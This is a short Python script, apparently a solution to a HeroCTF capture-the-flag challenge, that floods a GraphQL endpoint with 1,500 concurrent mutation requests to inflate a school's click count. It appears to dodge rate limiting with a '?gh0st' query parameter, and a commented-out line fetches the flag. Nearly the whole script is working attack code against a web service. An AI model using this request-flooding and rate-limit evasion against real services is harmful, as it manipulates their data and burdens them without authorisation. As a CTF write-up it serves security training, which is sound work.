import json, requests, multiprocessing


def letsgoo():
    header = {"Content-Type": "application/json"}
    data = {"query":"mutation { increaseClickSchool(schoolName: \"Flag CyberSecurity School\"){schoolId, nbClick} }"}
    requests.post(baseUrl + "/graphql?gh0st", headers=header, json=data)

baseUrl = "http://dyn-03.heroctf.fr:11560"

# for i in range(1400):
#     r = requests.post(baseUrl + "/graphql?gh0st", json=data, headers=header)
#     print(r.text)
for x in range(3):
    t = []
    for i in range(500):
        t.append(multiprocessing.Process(target=letsgoo))
    for j in t:
        j.start()
    for k in t:
        k.join()

# r = requests.get(baseUrl + "/flag")
# print(r.text)


